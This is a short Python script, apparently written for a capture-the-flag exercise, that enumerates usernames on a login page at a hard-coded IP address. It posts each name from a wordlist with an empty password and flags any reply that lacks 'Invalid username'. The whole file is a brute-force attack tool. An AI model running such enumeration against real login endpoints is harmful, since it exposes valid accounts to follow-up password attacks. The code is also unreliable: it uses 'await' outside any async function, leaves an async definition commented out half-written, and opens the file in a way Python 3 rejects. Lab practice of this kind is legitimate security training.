import requests_async as requests
import string
import asyncio

url = "http://35.227.24.107/92b3cf0c21/login"
inFile = open("usernames.txt", "r", 0)
wordlist =[] 
for line in inFile:
    line = line.split()
    wordlist.extend(line)

# async def (username):

for i in wordlist:
    print (i)
    txt = await requests.post(url, {"username": i, "password": ""}).text
    if txt.find("Invalid username") == -1:
        print ("Found username: " + i)
        break
